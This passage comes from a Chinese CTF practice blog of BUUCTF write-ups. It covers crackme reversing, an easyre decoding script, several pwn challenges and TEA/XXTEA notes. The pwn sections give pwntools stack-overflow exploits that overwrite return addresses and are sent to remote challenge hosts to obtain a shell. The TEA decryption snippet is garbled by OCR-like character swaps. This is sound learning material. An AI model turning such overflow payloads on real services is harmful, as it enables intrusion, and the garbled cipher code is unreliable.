</ul>
</li>
<li>经过上述循环后，调用了一个函数 <code>sub_401470</code>，并将 <code>v16</code> 和 <code>v13</code> 作为参数传递给它。</li>
<li>最后，将比较 <code>v13</code> 的值是否等于 <code>0xAB94</code>，如果相等，则返回 <code>true</code>，否则返回 <code>false</code>。</li>
</ol>
<p>先分析最后的 sub_401470(&amp;v16, &amp;v13);</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_401470@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebx&gt;, _BYTE *a2, _DWORD *a3)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *_EAX; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> _AL; <span class="comment">// al</span></span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *a2 != <span class="string">&#x27;d&#x27;</span> )</span><br><span class="line">    *a3 ^= <span class="number">3u</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *a3 |= <span class="number">4u</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2[<span class="number">1</span>] != <span class="string">&#x27;b&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 &amp;= <span class="number">0x61</span>u;</span><br><span class="line">    _EAX = (_DWORD *)*a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _EAX = a3;</span><br><span class="line">    *a3 |= <span class="number">0x14</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  __asm &#123; aam &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2[<span class="number">2</span>] != <span class="string">&#x27;a&#x27;</span> )</span><br><span class="line">    *a3 &amp;= <span class="number">0xA</span>u;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *a3 |= <span class="number">0x84</span>u;</span><br><span class="line">  <span class="keyword">if</span> ( a2[<span class="number">3</span>] != <span class="string">&#x27;p&#x27;</span> )</span><br><span class="line">    *a3 &gt;&gt;= <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *a3 |= <span class="number">0x114</span>u;</span><br><span class="line">  <span class="keyword">if</span> ( a2[<span class="number">4</span>] != <span class="string">&#x27;p&#x27;</span> )</span><br><span class="line">    *a3 *= <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *a3 |= <span class="number">0x380</span>u;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(*(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">24</span>) + <span class="number">12</span>) != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2[<span class="number">5</span>] != <span class="number">0x66</span> )</span><br><span class="line">      *a3 |= <span class="number">0x21</span>u;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      *a3 |= <span class="number">0x2DC</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2[<span class="number">5</span>] != <span class="string">&#x27;s&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">char</span>)a3;</span><br><span class="line">    *a3 ^= <span class="number">0x1AD</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0xA04</span>u;</span><br><span class="line">    v5 = (<span class="keyword">char</span>)a3;</span><br><span class="line">  &#125;</span><br><span class="line">  _AL = v5 - (~(a1 &gt;&gt; <span class="number">5</span>) - <span class="number">1</span>);</span><br><span class="line">  __asm &#123; daa &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a2[<span class="number">6</span>] != <span class="string">&#x27;e&#x27;</span> )</span><br><span class="line">    *a3 |= <span class="number">0x4A</span>u;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *a3 |= <span class="number">0x2310</span>u;</span><br><span class="line">  <span class="keyword">if</span> ( a2[<span class="number">7</span>] != <span class="string">&#x27;c&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 &amp;= <span class="number">0x3A3</span>u;</span><br><span class="line">    result = (_DWORD *)*a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = a3;</span><br><span class="line">    *a3 |= <span class="number">0x8A10</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为要满足最后的result==0xAB94，所以这里v16的值应该是dbappsec</p>
<p>然后再倒回去分析sub_401710(&amp;v16, username, v5++)</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240605214028526.png" alt="image-20240605214028526"></p>
<p>之后就差byte_5F6050的数据了，打好断点开始动调</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240605222037764.png" alt="image-20240605222037764"></p>
<p>在这里就可以看到eax是我们输入的密码，ecx就是我们所要的数据了，一个个记下来，但是不能让跳转发生，把这里改成jnz，0x7E 。。。。这里找出数据后发现和网上的wp不一致，换成x32就一致了，不知道为什么，数据为0x2A, 0xD7, 0x92, 0xE9, 0x53, 0xE2, 0xC4, 0xCD</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240605222235553.png" alt="image-20240605222235553"></p>
<p>之后按照流程写脚本逆向</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v16_2 = <span class="string">&quot;dbappsec&quot;</span></span><br><span class="line">user = <span class="string">&quot;welcomebeijing&quot;</span></span><br><span class="line"></span><br><span class="line">v16 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    temp = <span class="built_in">ord</span>(v16_2[i])^<span class="built_in">ord</span>(user[i])</span><br><span class="line">    v16.append(temp)</span><br><span class="line"><span class="built_in">print</span>(v16)</span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">byte_416050 = [<span class="number">0x2A</span>, <span class="number">0xD7</span>, <span class="number">0x92</span>, <span class="number">0xE9</span>, <span class="number">0x53</span>, <span class="number">0xE2</span>, <span class="number">0xC4</span>, <span class="number">0xCD</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    passwd += <span class="built_in">hex</span>(byte_416050[i]^v16[i]).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(passwd)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到密码39d09ffa4cfcc4cc</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240605225611324.png" alt="image-20240605225611324"></p>
<p>只不过这里buu答案是错的</p>
<h1 id="36-羊城杯-2020-easyre1"><a href="#36-羊城杯-2020-easyre1" class="headerlink" title="36[羊城杯 2020]easyre1"></a>36[羊城杯 2020]easyre1</h1><p>三个解密，exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">v=<span class="string">&quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;</span></span><br><span class="line">v2=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">    <span class="keyword">if</span> i &gt;=<span class="string">&#x27;A&#x27;</span> <span class="keyword">and</span> i&lt;=<span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">        v2+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">65</span>-<span class="number">3</span>)%<span class="number">26</span>+<span class="number">65</span>)</span><br><span class="line">    <span class="keyword">elif</span> i&gt;=<span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> i&lt;=<span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        v2+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">97</span>-<span class="number">3</span>)%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line">    <span class="keyword">elif</span> i&gt;=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> i&lt;=<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">        v2+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">48</span>-<span class="number">3</span>)%<span class="number">10</span>+<span class="number">48</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v2+=i</span><br><span class="line"></span><br><span class="line">v3=v2[<span class="number">13</span>:<span class="number">26</span>]+v2[<span class="number">39</span>:]+v2[:<span class="number">13</span>]+v2[<span class="number">26</span>:<span class="number">39</span>]</span><br><span class="line">flag=<span class="built_in">str</span>(v3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br><span class="line"></span><br><span class="line">BjYjM2Mjk4NzMR1dIVHs2NzJjY0MTEzM2VhMn0=zQ3NzhhMzhlOD</span><br><span class="line">R1dIVHs2NzJjYzQ3NzhhMzhlODBjYjM2Mjk4NzM0MTEzM2VhMn0=</span><br><span class="line"><span class="string">b&#x27;GWHT&#123;672cc4778a38e80cb362987341133ea2&#125;&#x27;</span></span><br></pre></td></tr></table></figure>























<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file re2 #查看文件信息	</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230505111645433.png" alt="image-20230505111645433"></p>
<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>下载文件后放到Ubuntu中查看文件信息</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230505122354266.png" alt="image-20230505122354266"></p>
<p>从图上可以看出它是一个64位程序，开了NX防护（堆栈不可执行）</p>
<p>代码中:</p>
<p>Relro：Full Relro（重定位表只读）<br>Relocation Read Only， 重定位表只读。重定位表即.got 和 .plt 两个表。<br>Stack：No Canary found（能栈溢出）<br>NX： NX enable（不可执行内存）<br>Non-Executable Memory，不可执行内存。<br>PIE： PIE enable（开启ASLR 地址随机化）<br>Address space layout randomization，地址空间布局随机化。通过将数据随机放置来防止攻击。</p>
<p>打开ida</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230505122624933-16832607854521.png" alt="image-20230505122624933"></p>
<p>双击/bin/sh, 点击command,点击X,发现/bin/sh的address在main函数里</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230505123200365.png" alt="image-20230505123200365"></p>
<p>发现main函数就是一个简单的system函数.直接调用了/bin/sh,所以根据题目提示直接nc就行.</p>
<p>回到Linux,直接nc做题</p>
<blockquote>
<p>简单查看一下nc的用法: nc -help<br>nc的全名是netcat，其主要用途是建立和监听任意TCP和UDP连接，支持ipv4和ipv6。因此，它可以用来网络调试、端口扫描等等</p>
</blockquote>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230505123420943.png" alt="image-20230505123420943"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230505123445254.png" alt="image-20230505123445254"></p>
<h2 id="rip1"><a href="#rip1" class="headerlink" title="rip1"></a>rip1</h2><p>也是先检查一下</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230505123638118.png" alt="image-20230505123638118"></p>
<p>发现并没有开启保护，并且有可执行可写片段</p>
<p>打开ida，找到main函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230506183032379.png" alt="image-20230506183032379"></p>
<p>发现main函数并不复杂，只是定义了一个 s ，而且我们很容易就能找到<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%A0%88%E6%BA%A2%E5%87%BA&spm=1001.2101.3001.7020">栈溢出</a>的点，我们都知道gets函数是一个危险函数，对于我们来说它可以接受到无限的字符，所以这里就是我们要pwn掉的点。</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230506183124665.png" alt="image-20230506183124665"></p>
<p>s有十五个空间</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230506183231331.png" alt="image-20230506183231331"></p>
<p>同时main函数下面还有一个fun函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510200113970.png" alt="image-20230510200113970"></p>
<p>这里可以直接看到/bin/sh的地址了，但是想试一下pwntool的查找功能</p>
<p>在pwntool里面再试一下</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510200325582.png" alt="image-20230510200325582"></p>
<p>ok，和ida分析的一样，very的好用啊</p>
<p>动态找一下栈溢出的空间</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510200612280.png" alt="image-20230510200612280"></p>
<p>单步运行至gets函数的地方，开始输入，查看栈信息</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510200807802.png" alt="image-20230510200807802"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">distance 0xffffd4dc 0xffffd548</span><br></pre></td></tr></table></figure>



<p>那么就是十五个字节的垃圾数据加八字节的覆盖rbp垃圾数据加八字节的0x40201b</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29220</span>)</span><br><span class="line">shell_addr=<span class="number">0x40201b</span></span><br><span class="line">payload=(<span class="string">b&#x27;A&#x27;</span>*<span class="number">15</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x40201b</span>))</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>但是没有奏效，很奇怪。。。</p>
<p>后来发现应该我忘了一个很重要的点，我根本没有call system。。。</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510205431100.png" alt="image-20230510205431100"></p>
<p>call system是在0x401191，而且前面也有/bin/sh字段了，所以要从0x401187开始，因为从86开始会push一个新的rbp，反正会导致Ubuntu的栈不对齐然后不成功 那再来试一下</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510205826322.png" alt="image-20230510205826322"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./pwn1&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27704</span>)</span><br><span class="line">shell_addr=<span class="number">0x40201b</span></span><br><span class="line">payload=(<span class="string">b&#x27;A&#x27;</span>*<span class="number">15</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x401187</span>))</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230510212357760.png" alt="image-20230510212357760"></p>
<p>flag{2ea2e49d-33f1-479a-8a8e-feb1ba93d082}</p>
<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704214919398.png" alt="image-20230704214919398"></p>
<p>打开ida，来到main函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704214947544.png" alt="image-20230704214947544"></p>
<p>有个return gets()，查看字符串信息</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704222341439.png" alt="image-20230704222341439"></p>
<p>发现了不得了的东西 cat flag.txt</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704222558605.png" alt="image-20230704222558605"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704222904315.png" alt="image-20230704222904315"></p>
<p>这个函数还可以直接执行，看看压栈地址</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704223027230.png" alt="image-20230704223027230"></p>
<p>那么返回地址就是0x400611了</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704223959185.png" alt="image-20230704223959185"></p>
<p>查看get函数的参数，距离返回地址</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704224120169.png" alt="image-20230704224120169"></p>
<p>这个参数是0x40，那么payload长度就是0x40+8</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;ip地址&#x27;</span>,ip端口)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>)+p64(<span class="number">0x400611</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704224817068.png" alt="image-20230704224817068"></p>
<p>打开ida，进入main函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704225040515.png" alt="image-20230704225040515"></p>
<p>跟进func()</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704225108960.png" alt="image-20230704225108960"></p>
<p>所以思路很简单，让gets的返回地址将11.28125写到v2上就行</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704225537455.png" alt="image-20230704225537455"></p>
<p>所以这个栈的情况是这样的</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704225623273.png" alt="image-20230704225623273"></p>
<p>因此，覆盖0x30-0x4=44个字节给v1，另外4个字节给v2</p>
<p>由于v2数值在内存中以16进制存储，所以，找到11.28125的16进制值。</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704230644621.png" alt="image-20230704230644621"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230704231349792.png" alt="image-20230704231349792"></p>
<p>0x41348000应该就是11.28125的十六进制值</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29191</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;A&quot;</span>*<span class="number">44</span>+p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()          </span><br></pre></td></tr></table></figure>

<p><strong>补充：</strong></p>
<table>
<thead>
<tr>
<th>变量类型</th>
<th>存储大小</th>
</tr>
</thead>
<tbody><tr>
<td>db</td>
<td>一字节</td>
</tr>
<tr>
<td>dw</td>
<td>两字节</td>
</tr>
<tr>
<td>dd</td>
<td>四字节</td>
</tr>
<tr>
<td>df</td>
<td>六字节</td>
</tr>
<tr>
<td>dq</td>
<td>八字节</td>
</tr>
</tbody></table>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTYwNTk1,size_16,color_FFFFFF,t_70#pic_center.png" alt="在这里插入图片描述"></p>
<p><a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database search (blukat.me)</a></p>
<h1 id="Reverse学习"><a href="#Reverse学习" class="headerlink" title="Reverse学习"></a>Reverse学习</h1><h2 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h2><ul>
<li>TEA这个简单加密算法在中国如此有名，主要因为腾讯系软件在大量协议和本地数据中使用这个算法。网上很多人甚至直接将TX的加密算法称为TEA算法。</li>
<li>0x9e3779b9</li>
<li>左移4或者右移5</li>
<li>普通TEA</li>
</ul>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240501212527115.png" alt="image-20240501212527115"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240501212120938.png" alt="image-20240501212120938"></p>
<p>XTEA是TEA的升级版，增加了更多的密钥表，移位和异或操作等等，设计者是Roger Needham, David Wheeler</p>
<p>TEA解密</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds，<span class="keyword">uint32_t</span> v[<span class="number">2</span>]，<span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">uint32_t</span> vO=v[<span class="number">0</span>]，v1=v[<span class="number">1</span>]，de1ta=Ox9E3779B9，sum=de1ta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">		v1 -= (((v0 &lt;&lt;<span class="number">4</span>) <span class="built_in">A</span> (v0 &gt;&gt; <span class="number">5</span>)) + v0) <span class="built_in">A</span> (sum + key[(sum&gt;&gt;<span class="number">11</span>)&amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">		v0 -= (((v1 &lt;&lt;<span class="number">4</span>) <span class="built_in">A</span>(v1 &gt;&gt;<span class="number">5</span>)) + v1) <span class="built_in">A</span>(sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line">	v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h2><p>XXTEA，又称Corrected Block TEA，是XTEA的升级版，设计者是Roger Needham, David Wheeler</p>
<ul>
<li>DELTA:算是该加密算法的一个特征值，为黄金分割数(5-2)/2与232的乘积。实际上，该值不影响算法，但能很好的避免一些算法错误。该数值在其他算法中也常有运用。</li>
<li>MX:对照图例。MIX值(混合，混淆)，在本例中请对照加密图解，算是算法的一部分。 </li>
<li>n: 对应明文或密文的数组长度。</li>
<li> v:明文或密文数组。对应图解中的X. key:密钥数组。对应图解中的Krounds: 加密循环的轮数。.</li>
<li>sum:对应图解中的D。</li>
<li>e:对应图解中的(D&gt;&gt;2)</li>
<li>p:本例中用作明文或密文数组的索引。</li>
<li>r:（扩散作用）参照代码，类比p&amp;3(该符号在图中而不在代码中)。3的二进制编码为11，任何数与其与运算后，可能产生(00,01,10,11),对应(0,1,2,3)</li>
<li>图解符号:<ul>
<li>方框:相加盒。将指向该盒的变量进行相加。</li>
<li>圆圈:异或盒。将指向该盒的变量进行异或。</li>
</ul>
</li>
</ul>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240501231749704.png" alt="image-20240501231749704"></p>
<p>XXTEA解密</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 